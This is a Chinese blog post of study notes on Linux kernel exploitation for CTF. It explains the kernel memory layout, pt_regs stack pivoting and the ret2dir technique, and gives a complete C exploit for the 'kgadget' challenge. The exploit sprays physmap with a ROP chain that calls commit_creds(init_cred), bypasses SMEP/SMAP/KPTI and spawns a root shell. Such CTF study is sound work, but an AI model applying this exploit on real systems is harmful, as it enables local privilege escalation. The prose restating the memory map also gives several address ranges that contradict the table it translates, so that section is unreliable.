---
title: kernal pwn 入门笔记
date: 2023-05-05 19:54:59 +0800
categories: [漏洞利用总结]
tags: [pwn, ctf]
permalink: /posts/id=64/
pin: false
published:
---





## 写在开始之前



 Linux 采用**四级页表**结构（PGD->PUD->PMD->PTE）

内核空间和用户空间，用户态 & 内核态

虚拟内存地址空间，运行环境上下文

![image.png](https://i.loli.net/2021/11/09/k8NHa1ljMEfXQbh.png)

切换

软中断 和 硬中断

软中断

**将用户态进程的寄存器逐一压入【用户态进程的栈上】**

接下来压入 SIGNALINFO 以及**指向系统调用 sigreturn 的代码**

```
mv core.cpio core.cpio.gz
gunzip -d core.cpio.gz
sudo cpio -idmv < core.cpio -D ./fs

find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../make/core.cpio
```

编译exp

```shell
gcc -masm=intel -no-pie -static ./exp.c -o ./core/exp
```

查找函数地址

```shell
cat /proc/kallsyms | grep commit_creds
```

**qemu dbg**

```shell
gdb bzImage -q
add-symbol-file ./core/kgadget.ko 0xffffffffc0002000
target remote :1234
```

PTI 页表隔离

```shell
cat /sys/devices/system/cpu/vulnerabilities/*
```

使用swapgs_restore_regs_and_return_to_usermode 

因为开启了`kpti`保护

ropper

```
ropper --clear-cache
ropper -f bzImage_elf --nocolor > gadget.txt
```





## 堆





## ret2user





## ret2dir



ret2dir 是为了绕过SMAP/SMEP保护模式

在开始之前需要首先需要了解一些知识点

首先是内核空间内存布局，这里考虑4级页表的布局情况

```
========================================================================================================================
    Start addr    |   Offset   |     End addr     |  Size   | VM area description
========================================================================================================================
                  |            |                  |         |
 0000000000000000 |    0       | 00007fffffffffff |  128 TB | user-space virtual memory, different per mm
__________________|____________|__________________|_________|___________________________________________________________
                  |            |                  |         |
 0000800000000000 | +128    TB | ffff7fffffffffff | ~16M TB | ... huge, almost 64 bits wide hole of non-canonical
                  |            |                  |         |     virtual memory addresses up to the -128 TB
                  |            |                  |         |     starting offset of kernel mappings.
__________________|____________|__________________|_________|___________________________________________________________
                                                            |
                                                            | Kernel-space virtual memory, shared between all processes:
____________________________________________________________|___________________________________________________________
                  |            |                  |         |
 ffff800000000000 | -128    TB | ffff87ffffffffff |    8 TB | ... guard hole, also reserved for hypervisor
 ffff880000000000 | -120    TB | ffff887fffffffff |  0.5 TB | LDT remap for PTI
 ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
 ffffc88000000000 |  -55.5  TB | ffffc8ffffffffff |  0.5 TB | ... unused hole
 ffffc90000000000 |  -55    TB | ffffe8ffffffffff |   32 TB | vmalloc/ioremap space (vmalloc_base)
 ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole
 ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)
 ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole
 ffffec0000000000 |  -20    TB | fffffbffffffffff |   16 TB | KASAN shadow memory
__________________|____________|__________________|_________|____________________________________________________________
                                                            |
                                                            | Identical layout to the 56-bit one from here on:
____________________________________________________________|____________________________________________________________
                  |            |                  |         |
 fffffc0000000000 |   -4    TB | fffffdffffffffff |    2 TB | ... unused hole
                  |            |                  |         | vaddr_end for KASLR
 fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping
 fffffe8000000000 |   -1.5  TB | fffffeffffffffff |  0.5 TB | ... unused hole
 ffffff0000000000 |   -1    TB | ffffff7fffffffff |  0.5 TB | %esp fixup stacks
 ffffff8000000000 | -512    GB | ffffffeeffffffff |  444 GB | ... unused hole
 ffffffef00000000 |  -68    GB | fffffffeffffffff |   64 GB | EFI region mapping space
 ffffffff00000000 |   -4    GB | ffffffff7fffffff |    2 GB | ... unused hole
 ffffffff80000000 |   -2    GB | ffffffff9fffffff |  512 MB | kernel text mapping, mapped to physical address 0
 ffffffff80000000 |-2048    MB |                  |         |
 ffffffffa0000000 |-1536    MB | fffffffffeffffff | 1520 MB | module mapping space
 ffffffffff000000 |  -16    MB |                  |         |
    FIXADDR_START | ~-11    MB | ffffffffff5fffff | ~0.5 MB | kernel-internal fixmap range, variable size and offset
 ffffffffff600000 |  -10    MB | ffffffffff600fff |    4 kB | legacy vsyscall ABI
 ffffffffffe00000 |   -2    MB | ffffffffffffffff |    2 MB | ... unused hole
__________________|____________|__________________|_________|___________________________________________________________
```

用户空间（User-space virtual memory）：

- **起始地址（Start addr）：** 0x0000000000000000
- **结束地址（End addr）：** 0x00007fffffffffff
- **大小（Size）：** 128 TB

用户空间是分配给用户程序的虚拟内存地址范围，每个进程都有自己独立的用户空间。

内核空间（Kernel-space virtual memory）：

- **起始地址（Start addr）：** 0xffff800000000000
- **结束地址（End addr）：** 0xffffffffffffffff

内核空间是共享给所有进程的虚拟内存地址范围，用于存储操作系统内核及其数据结构。

而在内核空间中，地址空间被划分为不同的区域，每个区域有不同的用途：

- **保护空隙（Guard hole）：** 0xffff800000000000 到 0xffff87ffffffffff，用于保护和超级监控程序（hypervisor）的区域，大小为8 TB。

- **LDT重映射（LDT remap for PTI）：** 0xffff880000000000 到 0xffff887fffffffff，大小为0.5 TB，用于Linux的页表隔离（PTI）。

  

- **直接映射物理内存（Direct mapping of all physical memory）：** 0xffff888000000000 到 0xffffc87fffffffff，大小为64 TB，用于将所有物理内存直接映射到虚拟内存中。

- **vmalloc/ioremap空间（vmalloc/ioremap space）：** 0xffffc90000000000 到 0xffffe8ffffffffff，大小为32 TB，用于动态分配内存和设备映射。

  

- **虚拟内存映射（Virtual memory map）：** 0xffffea0000000000 到 0xffffeaffffffffff，大小为1 TB，用于存储虚拟内存映射信息。

- **KASAN影子内存（KASAN shadow memory）：** 0xffffec0000000000 到 0xfffffbffffffffff，大小为16 TB，用于内核地址的安全性分析。

在内核空间的后半部分（从0xfffffc0000000000开始，“5f区域”）地址空间被划分为不同的区域，包括用于CPU入口区域映射、栈修复区域、EFI区域映射等。此外，还有一些未使用的区域和保留区域。

- **未使用的空隙（Unused hole）：** 0xffffc00000000000 到 0xffffdffffffffff，大小为2 TB，未被使用的虚拟内存空间。

- **vaddr_end for KASLR：** 0xffffe00000000000 到 0xffffe7fffffffff，大小为0.5 TB，用于存储内核地址空间布局随机化（KASLR）的结束地址。

- **CPU入口区域映射（cpu_entry_area mapping）：** 0xffffe80000000000 到 0xffffeffffffffff，大小为0.5 TB，用于映射CPU入口区域，其中包括内核代码执行的入口点。

- **%esp修复栈（%esp fixup stacks）：** 0xfffff00000000000 到 0xfffff7fffffffff，大小为0.5 TB，用于修复栈指针（%esp）的栈。

- **未使用的空隙（Unused hole）：** 0xfffff80000000000 到 0xfffffeeffffffff，大小为444 GB，未被使用的虚拟内存空间。

- **EFI区域映射空间（EFI region mapping space）：** 0xfffffef000000000 到 0xffffffffffffffff，大小为64 GB，用于映射EFI固件的内存区域。

- **未使用的空隙（Unused hole）：** 0xffffffff00000000 到 0xffffffff7fffffff，大小为2 GB，未被使用的虚拟内存空间。

  

- **内核文本映射（Kernel text mapping）：** 0xffffffff80000000 到 0xffffffff9fffffff，大小为512 MB，将内核代码映射到物理地址0处。

- **模块映射空间（Module mapping space）：** 0xffffffffa0000000 到 0xffffffffffefffff，大小为1520 MB，用于映射内核模块的内存区域。

  

- **内核内部fixmap范围（Kernel-internal fixmap range）：** 从近似0xffffff0000000000（可变大小和偏移量）开始，到0xffffffffff5fffff，大小约为0.5 MB，用于内核内部数据结构的固定映射。

- **传统vsyscall ABI（Legacy vsyscall ABI）：** 0xffffffffff600000 到 0xffffffffff600fff，大小为4 kB，用于处理系统调用的传统接口。

- **未使用的空隙（Unused hole）：** 0xffffffffffe00000 到 0xffffffffffffffff，大小为2 MB，未被使用的虚拟内存空间。

在直接映射物理内存段，映射了整个物理地址

```
ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
```

![img](https://e4l4pic.oss-cn-beijing.aliyuncs.com/d788d43f8794a4c226dfe3e34bf41bd5ac6e397d.jpg)

接下里聊一下利用 pt_regs 构造通用内核 ROP，这一段wiki上是有的：https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2ptregs/

```c
struct pt_regs {
/*
 * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
 * unless syscall needs a complete, fully filled "struct pt_regs".
 */
        unsigned long r15;
        unsigned long r14;
        unsigned long r13;
        unsigned long r12;
        unsigned long rbp;
        unsigned long rbx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
        unsigned long r11;
        unsigned long r10;
        unsigned long r9;
        unsigned long r8;
        unsigned long rax;
        unsigned long rcx;
        unsigned long rdx;
        unsigned long rsi;
        unsigned long rdi;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it's IRQ number:
 */
        unsigned long orig_rax;
/* Return frame for iretq */
        unsigned long rip;
        unsigned long cs;
        unsigned long eflags;
        unsigned long rsp;
        unsigned long ss;
/* top of stack page */
};
```



当执行 `entry_SYSCALL_64` 函数时，程序进入内核态，该函数会将所有的寄存器**压入内核栈上，形成一个 pt_regs 结构体**，该结构体实质上位于内核栈底。

内核栈**只有一个页面的大小**，而在我们通过函数指针劫持内核执行流时 **rsp 与 栈底的相对偏移通常是不变的**。

因此我们可以劫持执行形如 "add rsp, val ; ret" 的 gadget，此时便可以调整rsp到栈底部署的寄存器值区域(栈上的ROP链)，然乎执行如`pop rsp; ret `这样的gadget，就完成了一次栈迁移。栈迁移的目的是为了执行rop链，不然只能执行单个gadget。

ret2dir主要的手法即：

1. 在用户态使用mmap来大量映射进行堆喷，这里咱们申请的越多，我们在物理内存当中使用的地址就会越大，而后我们在内核态也能更快的得到我们所期待的重合段
2. 然后我们在内核态利用漏洞获得堆上的地址，也就是`kmalloc`后获取到的`slab`的地址，然后计算出physmap的地址(开启kaslr)
3. 利用ROP劫持执行流到physmap上面



### kgadget

启动脚本如下

```shell
#!/bin/sh
qemu-system-x86_64 \
	-m 256M \
	-cpu kvm64,+smep,+smap \
	-smp cores=2,threads=2 \
	-kernel bzImage \
	-initrd ./rootfs.cpio \
	-nographic \
	-monitor /dev/null \
	-snapshot \
	-append "console=ttyS0 nokaslr pti=on quiet oops=panic panic=1" \
	-no-reboot \
```

```shell
➜  core checksec kgadget.ko
[*] '/home/ef4tless/kernel_study/kgadget/core/kgadget.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```



kernel_module_init载入了一个dev名为kgadget

```c
int __cdecl kernel_module_init()
{
  _fentry__();
  spin._anon_0.rlock.raw_lock._anon_0.val.counter = 0;
  printk(&unk_480);
  major_num = _register_chrdev(0LL, 0LL, 256LL, "kgadget", &kgadget_fo);
  if ( major_num >= 0 )
  {
    printk(&unk_4F8);
    module_class = _class_create(&_this_module, "kgadget", &spin);
    if ( module_class <= 0xFFFFFFFFFFFFF000LL )
    {
      printk(&unk_560);
      module_device = device_create(module_class, 0LL, (major_num << 20), 0LL, "kgadget");
      if ( module_device <= 0xFFFFFFFFFFFFF000LL )
      {
        printk(&unk_5C0);
        return 0;
      }
      else
      {
        class_destroy(module_class);
        _unregister_chrdev(major_num, 0LL, 256LL, "kgadget");
        printk(&unk_590);
        return module_device;
      }
    }
    else
    {
      _unregister_chrdev(major_num, 0LL, 256LL, "kgadget");
      printk(&unk_530);
      return module_class;
    }
  }
  else
  {
    printk(&unk_4C0);
    return major_num;
  }
}
```

漏洞函数在于 kgadget_ioctl，当该函数的第二个参数为‘114514’时，将第三个参数赋值给rbx，后续call rbx，近似一个后门，如果能执行add rsp, val ; ret，就能执行rop链了。

```
.text.unlikely:00000000000000F3                               kgadget_ioctl proc near                 ; DATA XREF: __mcount_loc:0000000000000653↓o
.text.unlikely:00000000000000F3                                                                       ; .data:kgadget_fo↓o
.text.unlikely:00000000000000F3
.text.unlikely:00000000000000F3                               regs_addr= qword ptr -20h
.text.unlikely:00000000000000F3
.text.unlikely:00000000000000F3                               __file = rdi                            ; file *
.text.unlikely:00000000000000F3                               cmd = rsi                               ; unsigned int
.text.unlikely:00000000000000F3                               param = rdx                             ; unsigned __int64
.text.unlikely:00000000000000F3 E8 40 0F 00 00                call    __fentry__                      ; PIC mode
.text.unlikely:00000000000000F3
.text.unlikely:00000000000000F8 55                            push    rbp
.text.unlikely:00000000000000F9 48 89 E5                      mov     rbp, rsp
.text.unlikely:00000000000000FC 53                            push    rbx
.text.unlikely:00000000000000FD 48 83 EC 10                   sub     rsp, 10h
.text.unlikely:0000000000000101 65 48 8B 04 25 28 00 00 00    mov     rax, gs:28h
.text.unlikely:000000000000010A 48 89 45 F0                   mov     [rbp-10h], rax
.text.unlikely:000000000000010E 31 C0                         xor     eax, eax
.text.unlikely:0000000000000110 81 FE 52 BF 01 00             cmp     esi, 1BF52h
.text.unlikely:0000000000000116 0F 85 87 00 00 00             jnz     loc_1A3
.text.unlikely:0000000000000116
.text.unlikely:000000000000011C 48 8B 1A                      mov     rbx, [param]
.text.unlikely:000000000000011F                               kgadget_ptr = rbx                       ; void (*)(void)
.text.unlikely:000000000000011F 48 C7 C7 70 03 00 00          mov     __file, offset unk_370
.text.unlikely:0000000000000126 48 89 DE                      mov     cmd, kgadget_ptr
.text.unlikely:0000000000000129 E8 2A 0F 00 00                call    printk                          ; PIC mode
.text.unlikely:0000000000000129
.text.unlikely:000000000000012E 48 C7 C7 A0 03 00 00          mov     rdi, offset unk_3A0
.text.unlikely:0000000000000135 E8 1E 0F 00 00                call    printk                          ; PIC mode
.text.unlikely:0000000000000135
.text.unlikely:000000000000013A 48 89 65 E8                   mov     [rbp-18h], rsp
.text.unlikely:000000000000013E 48 8B 45 E8                   mov     rax, [rbp-18h]
.text.unlikely:0000000000000142 48 C7 C7 F8 03 00 00          mov     rdi, offset unk_3F8
.text.unlikely:0000000000000149 48 05 00 10 00 00             add     rax, 1000h
.text.unlikely:000000000000014F 48 25 00 F0 FF FF             and     rax, 0FFFFFFFFFFFFF000h
.text.unlikely:0000000000000155 48 8D 90 58 FF FF FF          lea     rdx, [rax-0A8h]
.text.unlikely:000000000000015C 48 89 55 E8                   mov     [rbp-18h], rdx
.text.unlikely:0000000000000160                               regs = rdx                              ; pt_regs *
.text.unlikely:0000000000000160 48 BA 61 72 74 74 6E 62 61 33 mov     regs, 3361626E74747261h
.text.unlikely:000000000000016A 48 89 90 58 FF FF FF          mov     [rax-0A8h], rdx
.text.unlikely:0000000000000171 48 89 90 60 FF FF FF          mov     [rax-0A0h], rdx
.text.unlikely:0000000000000178 48 89 90 68 FF FF FF          mov     [rax-98h], rdx
.text.unlikely:000000000000017F 48 89 90 70 FF FF FF          mov     [rax-90h], rdx
.text.unlikely:0000000000000186 48 89 90 78 FF FF FF          mov     [rax-88h], rdx
.text.unlikely:000000000000018D 48 89 50 80                   mov     [rax-80h], rdx
.text.unlikely:0000000000000191 48 89 50 90                   mov     [rax-70h], rdx
.text.unlikely:0000000000000195 E8 BE 0E 00 00                call    printk                          ; PIC mode
.text.unlikely:0000000000000195
.text.unlikely:000000000000019A E8 B1 0E 00 00                call    __x86_indirect_thunk_rbx        ; PIC mode
.text.unlikely:000000000000019A
```



EXP仅供参考：

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/mman.h>

const size_t init_cred = 0xffffffff82a6b700;
const size_t commit_creds = 0xffffffff810c92e0;
const size_t prepare_kernel_cred = 0xffffffff810c9540;
const size_t swapgs_pop2_retuser = 0xFFFFFFFF81C00FB0 + 0x1B;
const size_t pop_rsp_ret = 0xffffffff811483d0;
const size_t add_rsp = 0xffffffff810737fe;
const size_t pop_rdi_ret = 0xffffffff8108c6f0;
const size_t ret = 0xffffffff810001fc;

long page_size;     //一页大小
int dev;
size_t* map_spray[16000];
size_t guess;   
size_t user_cs, user_ss, user_rflags, user_sp;

void save_status();
void info_log(char*);
void error_log(char*);
void getShell();
void makeROP(size_t*);

void info_log(char* str){
  printf("\033[0m\033[1;32m[+]%s\033[0m\n",str);
}

void error_log(char* str){
  printf("\033[0m\033[1;31m%s\033[0m\n",str);
  exit(1);
}
void save_status(){
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
        );
  info_log("Status has been saved.");
}

void getShell(){
  info_log("Ready to get root........");
  if(getuid()){
    error_log("Failed to get root!");
  }
  info_log("Root got!");
  system("/bin/sh");
}

void makeROP(size_t* space){
  int index = 0;
  for(; index < (page_size / 8 - 0x30); index++)
     space[index] = add_rsp;
  for(; index < (page_size / 8 - 0x10); index++)
    space[index] = ret;

  space[index++] = pop_rdi_ret;
  space[index++] = init_cred;
  space[index++] = commit_creds;
  space[index++] = swapgs_pop2_retuser;
  space[index++] = 0xDeadBeef;
  space[index++] = 0xdEADbEAF;
  space[index++] = (size_t)getShell;
  space[index++] = user_cs;
  space[index++] = user_rflags;
  space[index++] = user_sp;
  space[index++] = user_ss;
}

int main(){
  save_status();
  dev = open("/dev/kgadget", O_RDWR);
  if(dev < 0){
    error_log("Cannot open device \"/dev/kgadget\"!");
  }
  page_size = sysconf(_SC_PAGESIZE);    //获取当前系统的页面大小（以字节为单位）
  info_log("Spraying physmap...");

  map_spray[0] = mmap(NULL, page_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  makeROP(map_spray[0]); 
  info_log("make done!");
    // printf("\033[32m\033[1m"
    //     "[+] ADDR:"
    // "\033[0m%lx\n", &map_spray[0]);
  for(int i=1; i<15000; i++){
    map_spray[i] = mmap(NULL, page_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if(!map_spray[i]){
      error_log("Mmap Failed!");
    }
    memcpy(map_spray[i], map_spray[0], page_size);
  }
  guess = 0xFFFF888000000000 + 0x7000000;
  info_log("Ready to ture to kernel.....");
  __asm__("mov r15, 0xdeadbeef;"
          "mov r14, 0xceadbeef;"
          "mov r13, 0xbeadbeef;"
          "mov r12, 0xaeadbeef;"
          "mov r11, 0xdeadbeef;"
          "mov r10, 0x123456;"
          "mov rbp, 0x1234567;"
          "mov rbx, 0x87654321;"
          "mov r9, 0xdeadbeef;"
          "mov r8, 0xdeadbeef;"
          "mov rax, 0x10;"
          "mov rcx, 0x12344565;"
          "mov rdx, guess;"
          "mov rsi, 0x1bf52;"
          "mov rdi, dev;"
          "syscall;"
        );
  return 0;
}

```

https://www.52pojie.cn/thread-1755363-1-1.html







参考链接：

https://cs.brown.edu/~vpk/papers/ret2dir.sec14.pdf



